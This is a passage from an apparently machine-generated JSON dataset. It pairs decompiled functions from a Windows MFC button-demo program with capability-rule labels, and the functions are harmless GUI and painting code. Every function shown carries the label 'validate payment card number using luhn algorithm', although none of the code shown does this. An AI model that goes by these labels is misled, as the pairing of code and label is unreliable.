vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x15);\n    *arg1 = vtable.CButton.0;\n    fcn.14000b6d8(arg1);\n    uVar5 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar3 = arg1[0x13];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3, 1, in_R8, in_R9, uVar5);\n    }\n    pcVar4 = arg1[0x14];\n    if ((pcVar4 != NULL) && (*(pcVar4 + 0x50) == arg1)) {\n        *(pcVar4 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 715
    },
    "140002d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140002d80(code **arg1)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar3;\n    \n    fcn.140002930(arg1 + 0x134);\n    fcn.140002930(arg1 + 0x107);\n    fcn.140002930(arg1 + 0xda);\n    fcn.140002930(arg1 + 0xad);\n    fcn.140002930(arg1 + 0x80);\n    fcn.140002930(arg1 + 0x53);\n    fcn.140002930(arg1 + 0x26);\n    arg1[0x23] = vtable.CPalette.0;\n    fcn.140002730(arg1 + 0x23);\n    arg1[0x21] = vtable.CBitmap.0;\n    fcn.140002730(arg1 + 0x21);\n    arg1[0x1f] = vtable.CRgn.0;\n    fcn.140002730(arg1 + 0x1f);\n    *arg1 = vtable.CDialog.0;\n    if (arg1[8] != NULL) {\n        fcn.14000b6d8(arg1);\n    }\n    uVar3 = 0xfffffffffffffffe;\n    *arg1 = vtable.CWnd.0;\n    if ((((arg1[8] != NULL) && (arg1 != 0x140053000)) && (arg1 != 0x1400530b0)) &&\n       ((arg1 != 0x140053160 && (arg1 != 0x140053210)))) {\n        fcn.14000b6d8(arg1);\n    }\n    piVar1 = arg1[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1, 1, in_R8, in_R9, uVar3);\n    }\n    pcVar2 = arg1[0x14];\n    if ((pcVar2 != NULL) && (*(pcVar2 + 0x50) == arg1)) {\n        *(pcVar2 + 0x50) = 0;\n    }\n    if (arg1[4] != NULL) {\n        (**(arg1[4] + 0x38))();\n    }\n    arg1[7] = NULL;\n    return;\n}\n",
        "token_count": 536
    },
    "14000391": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140003910(code **arg1, code *arg2, uint *arg3)\n\n{\n    code **arg1_00;\n    int32_t iVar1;\n    ulong uVar2;\n    code *pcVar3;\n    uchar auStackX16 [8];\n    \n    fcn.140006f44(arg1);\n    *arg1 = vtable.CMemDC.0;\n    arg1_00 = arg1 + 4;\n    pcVar3 = NULL;\n    arg1[5] = NULL;\n    *arg1_00 = vtable.CBitmap.0;\n    arg1[6] = NULL;\n    arg1[7] = arg2;\n    iVar1 = *(arg2 + 0x18);\n    *(arg1 + 10) = iVar1 == 0;\n    *(arg1 + 8) = *arg3;\n    *(arg1 + 0x44) = arg3[1];\n    *(arg1 + 9) = arg3[2];\n    *(arg1 + 0x4c) = arg3[3];\n    if ((iVar1 == 0) == 0) {\n        *(arg1 + 3) = *(arg2 + 0x18);\n        arg1[1] = *(arg2 + 8);\n        arg1[2] = *(arg2 + 0x10);\n    }\n    else {\n        uVar2 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(*(arg2 + 8));\n        fcn.1400074fc(arg1, uVar2);\n        uVar2 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(*(arg2 + 8), *(arg1 + 9) - *(arg1 + 8));\n        fcn.1400077d0(arg1_00, uVar2);\n        if (arg1_00 != NULL) {\n            pcVar3 = arg1[5];\n        }\n        pcVar3 = fcn.1400078a4(arg1[1], pcVar3);\n        arg1[6] = pcVar3;\n        fcn.140007128(arg1, auStackX16, *(arg1 + 8), *(arg1 + 0x44));\n    }\n    return arg1;\n}\n",
        "token_count": 494
    },
    "140003f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140003f60(code **arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    \n    fcn.140013938(arg1, 0x66, arg2);\n    *arg1 = vtable.CTransparentButtonDemoDlg.0;\n    *(arg1 + 0x1e) = 300;\n    *(arg1 + 0xf4) = 300;\n    arg1[0x20] = NULL;\n    arg1[0x1f] = vtable.CRgn.0;\n    arg1[0x22] = NULL;\n    arg1[0x21] = vtable.CBitmap.0;\n    arg1[0x24] = NULL;\n    arg1[0x23] = vtable.CPalette.0;\n    fcn.140002820(arg1 + 0x26);\n    fcn.140002820(arg1 + 0x53);\n    fcn.140002820(arg1 + 0x80);\n    fcn.140002820(arg1 + 0xad);\n    fcn.140002820(arg1 + 0xda);\n    fcn.140002820(arg1 + 0x107);\n    fcn.140002820(arg1 + 0x134);\n    *(arg1 + 0x25) = 0x81;\n    fcn.140006c48();\n    iVar1 = fcn.140006c48();\n    pcVar2 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0x18), 0x80);\n    arg1[0x1d] = pcVar2;\n    return arg1;\n}\n",
        "token_count": 369
    },
    "14000420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.140004200(int64_t *arg1, char *arg2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    \n    piVar3 = fcn.14000fd70();\n    if (piVar3 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar2 = swi(3);\n        piVar3 = (*pcVar2)();\n        return piVar3;\n    }\n    iVar4 = (**(*piVar3 + 0x18))();\n    *arg1 = iVar4 + 0x18;\n    if (arg2 == NULL) {\n        uVar5 = 0;\n    }\n    else {\n        if ((arg2 & 0xffffffffffff0000) == 0) {\n            iVar4 = fcn.14000fd5c(arg2 & 0xffff);\n            if (iVar4 == 0) {\n                return arg1;\n            }\n            fcn.1400021c0(arg1, iVar4, arg2 & 0xffff);\n            return arg1;\n        }\n        iVar4 = -1;\n        pcVar6 = arg2;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        uVar5 = ~iVar4 - 1;\n    }\n    fcn.1400022f0(arg1, arg2, uVar5);\n    return arg1;\n}\n",
        "token_count": 379
    },
    "140005a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140005a48(ulong arg1)\n\n{\n    code *pcVar1;\n    code **arg1_00;\n    code **appcStackX16 [3];\n    \n    arg1_00 = fcn.140005870(0x18);\n    if (arg1_00 == NULL) {\n        arg1_00 = NULL;\n    }\n    else {\n        appcStackX16[0] = arg1_00;\n        fcn.140005e88(arg1_00);\n        *arg1_00 = vtable.COleException.0;\n        *(arg1_00 + 2) = 0;\n    }\n    *(arg1_00 + 2) = arg1;\n    appcStackX16[0] = arg1_00;\n    fcn.14001bb88(appcStackX16, 0x14003a988);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 213
    },
    "14000643": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000643c(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    ulong in_R8;\n    ulong in_R9;\n    \n    *arg1 = vtable.AFX_MODULE_STATE.0;\n    piVar3 = arg1[0x17];\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 0x18))(piVar3, arg1 + 0x10, in_R8, in_R9, 0xfffffffffffffffe);\n        piVar3 = arg1[0x17];\n        if (piVar3 != NULL) {\n            (**(*piVar3 + 8))(piVar3, 1);\n        }\n    }\n    puVar4 = *arg1[0x19];\n    if (puVar4 != NULL) {\n        (***puVar4)(puVar4, 1);\n    }\n    puVar4 = *(arg1[0x19] + 8);\n    if (puVar4 != NULL) {\n        (***puVar4)(puVar4, 1);\n    }\n    fcn.1400058b4(arg1[0x19]);\n    if ((arg1[0x1b] != NULL) && (arg1[0x1b] != 0xffffffffffffffff)) {\n        if (*0x14004fe20 != NULL) {\n            (**0x14004fe20)();\n        }\n        arg1[0x1b] = 0xffffffffffffffff;\n    }\n    fcn.1400157d4(arg1 + 0x18);\n    pcVar5 = arg1[0xb];\n    LOCK();\n    piVar1 = pcVar5 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(pcVar5 + -0x18) + 8))();\n    }\n    return;\n}\n",
        "token_count": 457
    },
    "14000652": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140006528(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iStackX8;\n    \n    fcn.140004200(&iStackX8, \"comctl32.dll\");\n    *arg1 = vtable.CDllIsolationWrapperBase.0;\n    iVar3 = fcn.140002100(iStackX8 + -0x18);\n    arg1[3] = iVar3 + 0x18;\n    arg1[1] = NULL;\n    *(arg1 + 2) = 0;\n    LOCK();\n    piVar1 = iStackX8 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStackX8 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CComCtlWrapper.0;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[8] = NULL;\n    arg1[9] = NULL;\n    arg1[10] = NULL;\n    arg1[0xb] = NULL;\n    arg1[0xc] = NULL;\n    arg1[0xd] = NULL;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    arg1[0x10] = NULL;\n    arg1[0x11] = NULL;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    arg1[0x15] = NULL;\n    arg1[0x16] = NULL;\n    arg1[0x17] = NULL;\n    arg1[0x18] = NULL;\n    arg1[0x19] = NULL;\n    arg1[0x1a] = NULL;\n    arg1[0x1b] = NULL;\n    arg1[0x1c] = NULL;\n    arg1[0x1d] = NULL;\n    arg1[0x1e] = NULL;\n    arg1[0x1f] = NULL;\n    arg1[0x20] = NULL;\n    arg1[0x21] = NULL;\n    arg1[0x22] = NULL;\n    arg1[0x23] = NULL;\n    arg1[0x24] = NULL;\n    arg1[0x25] = NULL;\n    arg1[0x26] = NULL;\n    arg1[0x27] = NULL;\n    arg1[0x28] = NULL;\n    arg1[0x29] = NULL;\n    arg1[0x2a] = NULL;\n    arg1[0x2b] = NULL;\n    arg1[0x2c] = NULL;\n    arg1[0x2d] = NULL;\n    arg1[0x2e] = NULL;\n    arg1[0x2f] = NULL;\n    arg1[0x30] = NULL;\n    arg1[0x31] = NULL;\n    arg1[0x32] = NULL;\n    arg1[0x33] = NULL;\n    arg1[0x34] = NULL;\n    arg1[0x35] = NULL;\n    arg1[0x36] = NULL;\n    arg1[0x37] = NULL;\n    arg1[0x38] = NULL;\n    arg1[0x39] = NULL;\n    arg1[0x3a] = NULL;\n    arg1[0x3b] = NULL;\n    arg1[0x3c] = NULL;\n    arg1[0x3d] = NULL;\n    arg1[0x3e] = NULL;\n    arg1[0x3f] = NULL;\n    arg1[0x40] = NULL;\n    arg1[0x41] = NULL;\n    arg1[0x42] = NULL;\n    arg1[0x43] = NULL;\n    arg1[0x44] = NULL;\n    arg1[0x45] = NULL;\n    arg1[0x46] = NULL;\n    arg1[0x47] = NULL;\n    arg1[0x48] = NULL;\n    arg1[0x49] = NULL;\n    arg1[0x4a] = NULL;\n    arg1[0x4b] = NULL;\n    arg1[0x4c] = NULL;\n    arg1[0x4d] = NULL;\n    arg1[0x4e] = NULL;\n    arg1[0x4f] = NULL;\n    arg1[0x50] = NULL;\n    arg1[0x51] = NULL;\n    arg1[0x52] = NULL;\n    arg1[0x53] = NULL;\n    arg1[0x54] = NULL;\n    arg1[0x55] = NULL;\n    arg1[0x56] = NULL;\n    arg1[0x57] = NULL;\n    arg1[0x58] = NULL;\n    arg1[0x59] = NULL;\n    arg1[0x5a] = NULL;\n    arg1[0x5b] = NULL;\n    arg1[0x5c] = NULL;\n    arg1[0x5d] = NULL;\n    arg1[0x5e] = NULL;\n    arg1[0x5f] = NULL;\n    arg1[0x60] = NULL;\n    arg1[0x61] = NULL;\n    return arg1;\n}\n",
        "token_count": 1277
    },
    "14000682": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140006824(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iStackX8;\n    \n    fcn.140004200(&iStackX8, \"comdlg32.dll\");\n    *arg1 = vtable.CDllIsolationWrapperBase.0;\n    iVar3 = fcn.140002100(iStackX8 + -0x18);\n    arg1[3] = iVar3 + 0x18;\n    arg1[1] = NULL;\n    *(arg1 + 2) = 0;\n    LOCK();\n    piVar1 = iStackX8 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStackX8 + -0x18) + 8))();\n    }\n    *arg1 = vtable.CCommDlgWrapper.0;\n    arg1[4] = NULL;\n    arg1[5] = NULL;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[8] = NULL;\n    arg1[9] = NULL;\n    arg1[10] = NULL;\n    arg1[0xb] = NULL;\n    arg1[0xc] = NULL;\n    arg1[0xd] = NULL;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    arg1[0x10] = NULL;\n    arg1[0x11] = NULL;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    arg1[0x15] = NULL;\n    arg1[0x16] = NULL;\n    arg1[0x17] = NULL;\n    arg1[0x18] = NULL;\n    return arg1;\n}\n",
        "token_count": 444
    },
    "14000698": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140006984(code **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t aiStackX8 [4];\n    \n    fcn.140004200(aiStackX8, \"shell32.dll\");\n    *arg1 = vtable.CDllIsolationWrapperBase.0;\n    iVar3 = fcn.140002100(aiStackX8[0] + -0x18);\n    arg1[3] = iVar3 + 0x18;\n    arg1[1] = NULL;\n    *(arg1 + 2) = 0;\n    LOCK();\n    piVar1 = aiStackX8[0] + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(aiStackX8[0] + -0x18) + 8))();\n    }\n    *arg1 = vtable.CShellWrapper.0;\n    arg1[4] = NULL;\n    return arg1;\n}\n",
        "token_count": 249
    },
    "140006a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140006a0c(code **arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    code **ppcVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    ulong uVar5;\n    \n    *arg1 = vtable.AFX_MODULE_STATE.0;\n    arg1[6] = NULL;\n    arg1[7] = NULL;\n    arg1[8] = NULL;\n    arg1[9] = NULL;\n    piVar1 = fcn.14000fd70();\n    if (piVar1 == NULL) {\n        fcn.140001010(0x80004005);\n        pcVar4 = swi(3);\n        ppcVar2 = (*pcVar4)();\n        return ppcVar2;\n    }\n    iVar3 = (**(*piVar1 + 0x18))(piVar1);\n    arg1[0xb] = iVar3 + 0x18;\n    arg1[0xe] = NULL;\n    arg1[0xf] = NULL;\n    *(arg1 + 0x11) = 0xffffffff;\n    arg1[0x12] = NULL;\n    arg1[0x15] = NULL;\n    *(arg1 + 0x16) = 0;\n    arg1[9] = 0x40;\n    arg1[7] = 0x20;\n    *(arg1 + 0x2c) = 0;\n    *(arg1 + 5) = arg2;\n    if ((*(arg1[0xb] + -0xc) - 0x1000U | 1U - *(arg1[0xb] + -8)) < 0) {\n        fcn.1400020a0(arg1 + 0xb, 0x1000);\n    }\n    *(arg1 + 0x54) = 1;\n    arg1[0xf] = 0x20;\n    pcVar4 = fcn.140005870(0x18);\n    arg1[0x19] = pcVar4;\n    iVar3 = fcn.140014f70(0x310);\n    if (iVar3 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.140006528(iVar3);\n    }\n    *arg1[0x19] = uVar5;\n    iVar3 = fcn.140014f70(200);\n    if (iVar3 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.140006824(iVar3);\n    }\n    *(arg1[0x19] + 8) = uVar5;\n    iVar3 = fcn.140014f70(0x28);\n    if (iVar3 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        uVar5 = fcn.140006984(iVar3);\n    }\n    *(arg1[0x19] + 0x10) = uVar5;\n    *(arg1 + 0x1a) = 1;\n    arg1[0x1b] = NULL;\n    *(arg1 + 0x1c) = 0;\n    *(arg1 + 0xe4) = 0;\n    return arg1;\n}\n",
        "token_count": 736
    },
    "1400075c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.1400075c0(code **arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    code *pcVar2;\n    \n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    *(arg1 + 3) = 0;\n    *arg1 = vtable.CClientDC.0;\n    if (arg2 == 0) {\n        pcVar2 = NULL;\n    }\n    else {\n        pcVar2 = *(arg2 + 0x40);\n    }\n    arg1[4] = pcVar2;\n    arg2_00 = (*_sym.imp.USER32.dll_GetDC)();\n    iVar1 = fcn.1400074fc(arg1, arg2_00);\n    if (iVar1 == 0) {\n        fcn.140006ee8();\n    }\n    return arg1;\n}\n",
        "token_count": 199
    },
    "14000762": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.140007624(code **arg1)\n\n{\n    ulong uVar1;\n    ulong in_R8;\n    ulong in_R9;\n    ulong uVar2;\n    \n    uVar2 = 0xfffffffffffffffe;\n    *arg1 = vtable.CClientDC.0;\n    uVar1 = fcn.140007548(arg1);\n    (*_sym.imp.USER32.dll_ReleaseDC)(arg1[4], uVar1, in_R8, in_R9, uVar2);\n    *arg1 = vtable.CDC.0;\n    if (arg1[1] != NULL) {\n        uVar1 = fcn.140007548(arg1);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 169
    },
    "14000766": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.140007664(code **arg1, int64_t hWnd)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong in_R8;\n    ulong in_R9;\n    \n    arg1[1] = NULL;\n    arg1[2] = NULL;\n    *(arg1 + 3) = 0;\n    *arg1 = vtable.CPaintDC.0;\n    pcVar1 = *(hWnd + 0x40);\n    arg1[4] = pcVar1;\n    arg2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, arg1 + 5, in_R8, in_R9, 0xfffffffffffffffe);\n    iVar2 = fcn.1400074fc(arg1, arg2);\n    if (iVar2 == 0) {\n        fcn.140006ee8();\n    }\n    return arg1;\n}\n",
        "token_count": 202
    },
    "1400076c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1400076c4(code **lpPaint)\n\n{\n    ulong uVar1;\n    ulong in_R8;\n    ulong in_R9;\n    \n    *lpPaint = vtable.CPaintDC.0;\n    (*_sym.imp.USER32.dll_EndPaint)(lpPaint[4], lpPaint + 5, in_R8, in_R9, 0xfffffffffffffffe);\n    fcn.140007548(lpPaint);\n    *lpPaint = vtable.CDC.0;\n    if (lpPaint[1] != NULL) {\n        uVar1 = fcn.140007548(lpPaint);\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "1400080a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong fcn.1400080a0(int64_t arg1, uint32_t *arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint32_t uStack12;\n    \n    iVar1 = fcn.140007e50();\n    if (iVar1 == 0) {\n        if ((((arg1 == 0x12340042) && (arg2 != NULL)) && (0x27 < *arg2)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_SystemParametersInfoA)(0x30, 0, &uStack24),  iVar1 != 0)) {\n            arg2[1] = 0;\n            arg2[2] = 0;\n            uVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0);\n            arg2[3] = uVar2;\n            uVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(1);\n            arg2[9] = 1;\n            arg2[5] = uStack24;\n            arg2[6] = uStack20;\n            arg2[7] = uStack16;\n            arg2[8] = uStack12;\n            arg2[4] = uVar2;\n            if (0x47 < *arg2) {\n                fcn.14001c008(arg2 + 10, 0x20, \"DISPLAY\", 0x1f);\n            }\n            return 1;\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = (**0x140052fd0)(arg1, arg2);\n    }\n    return uVar3;\n}\n",
        "token_count": 390
    },
    "14000ade": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint fcn.14000ade4(int64_t *arg1, uint64_t arg2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t arg1_00;\n    int64_t iVar6;\n    int32_t iVar7;\n    \n    iVar7 = 0;\n    bVar1 = true;\n    bVar2 = true;\n    if (((arg2 & 4) == 0) || (uVar3 = fcn.140007b34(arg1),  (uVar3 >> 0x1c & 1) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)();\n    *(arg1 + 0xf) = *(arg1 + 0xf) | 0x18;\n    arg1_00 = fcn.140012780();\ncode_r0x00014000aec1:\n    while ((!bVar2 || (iVar4 = (*_sym.imp.USER32.dll_PeekMessageA)(arg1_00, 0, 0, 0, 0),  iVar4 != 0))) {\n        do {\n            iVar4 = fcn.140012cf0();\n            if (iVar4 == 0) {\n                fcn.1400119bc(0);\n                return 0xffffffff;\n            }\n            if ((bVar1) && ((*(arg1_00 + 8) == 0x118 || (*(arg1_00 + 8) == 0x104)))) {\n                fcn.140007c14(arg1, 1);\n                (*_sym.imp.USER32.dll_UpdateWindow)(arg1[8]);\n                bVar1 = false;\n            }\n            iVar4 = (**(*arg1 + 0x110))(arg1);\n            if (iVar4 == 0) {\n                *(arg1 + 0xf) = *(arg1 + 0xf) & 0xffffffe7;\n                return *(arg1 + 0x11);\n            }\n            iVar4 = fcn.140012ba8(arg1_00);\n            if (iVar4 != 0) {\n                iVar7 = 0;\n                bVar2 = true;\n            }\n            iVar4 = (*_sym.imp.USER32.dll_PeekMessageA)();\n        } while (iVar4 != 0);\n    }\n    if (bVar1) {\n        fcn.140007c14(arg1, 1);\n        (*_sym.imp.USER32.dll_UpdateWindow)();\n        bVar1 = false;\n    }\n    if ((((arg2 & 1) == 0) && (iVar5 != 0)) && (iVar7 == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)();\n    }\n    if ((arg2 & 2) == 0) goto code_r0x00014000aea2;\n    goto code_r0x00014000aebf;\ncode_r0x00014000aea2:\n    iVar6 = (*_sym.imp.USER32.dll_SendMessageA)();\n    iVar7 = iVar7 + 1;\n    if (iVar6 == 0) {\ncode_r0x00014000aebf:\n        bVar2 = false;\n    }\n    goto code_r0x00014000aec1;\n}\n",
        "token_count": 730
    },
    "14000b8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000b8e0(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140015718(0x14004fe50, 0x140005e54);\n    if (iVar2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    (**(*arg1 + 0x240))(arg1, *(iVar2 + 0xa0), *(iVar2 + 0xa8), *(iVar2 + 0xb0), arg2);\n    return;\n}\n",
        "token_count": 152
    },
    "14000bbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.14000bbc4(int64_t *arg1, int32_t *arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    ulong arg1_00;\n    int64_t hWnd;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if (((((arg3 >> 0x1c & 1) == 0) && (uVar2 = fcn.140007b34(arg1),  (uVar2 & 0x50000000) == 0)) &&\n        ((*_sym.imp.USER32.dll_GetWindowRect)(arg1[8], &iStack24),  *arg2 == iStack24)) && (arg2[1] == iStack20)) {\n        arg1_00 = (*_sym.imp.USER32.dll_GetWindow)(arg1[8]);\n        hWnd = fcn.14000b398(arg1_00);\n        if (((hWnd == 0) || (iVar1 = fcn.140007c44(hWnd),  iVar1 == 0)) &&\n           (iVar1 = (**(*arg1 + 0x248))(arg1),  iVar1 != 0)) {\n            fcn.14000ab8c(arg1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "14000c07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
